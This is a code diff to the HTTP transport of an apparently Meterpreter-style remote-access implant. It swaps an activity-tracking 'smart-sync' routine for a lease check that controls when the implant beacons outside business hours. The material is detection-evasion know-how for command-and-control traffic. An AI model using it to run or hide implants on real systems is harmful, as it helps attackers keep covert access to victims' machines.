@@ -21,7 +21,7 @@
 // Async mode helpers (defined in core_async.c)
 extern BOOL async_in_work_hours(HttpTransportContext* ctx);
 extern DWORD async_calculate_sleep_ms(HttpTransportContext* ctx);
-extern VOID async_touch_activity(HttpTransportContext* ctx);
+extern BOOL async_lease_is_active(HttpTransportContext* ctx);
 
 /*!
  * @brief Prepare a winHTTP request with the given context.
@@ -403,12 +403,6 @@ static DWORD packet_transmit_http(Remote *remote, LPBYTE rawPacket, DWORD rawPac
 
 		dprintf("[PACKET TRANSMIT HTTP] request sent.. apparently");
 
-		// Async smart-sync: record that we just sent a response so the next
-		// idle poll uses the short burst delay instead of the full poll interval.
-		if (ctx->async_mode)
-		{
-			async_touch_activity(ctx);
-		}
 		res = ctx->receive_response(hReq);
 		if (!res)
 		{
@@ -813,7 +807,7 @@ static DWORD server_dispatch_http(Remote* remote, THREAD* dispatchThread)
 		}
 
 		// Async mode: wait until inside business hours before polling
-		if (ctx->async_mode && (ctx->async_work_start != ctx->async_work_end) && !async_in_work_hours(ctx))
+		if (ctx->async_mode && !async_lease_is_active(ctx) && !async_in_work_hours(ctx))
 		{
 			dprintf("[DISPATCH] Outside business hours, sleeping 60s before re-check");
 			if (ctx->async_wake_event)
@@ -908,14 +902,6 @@ static DWORD server_dispatch_http(Remote* remote, THREAD* dispatchThread)
 
 			// Reset the empty count when we receive a packet
 			ecount = 0;
-
-			// Async smart-sync: an actual request from the framework means an
-			// operator interaction is in flight; the next idle poll should
-			// stay in the tight burst loop.
-			if (ctx->async_mode)
-			{
-				async_touch_activity(ctx);
-			}
 
 			dprintf("[DISPATCH] Returned result: %d", result);
 
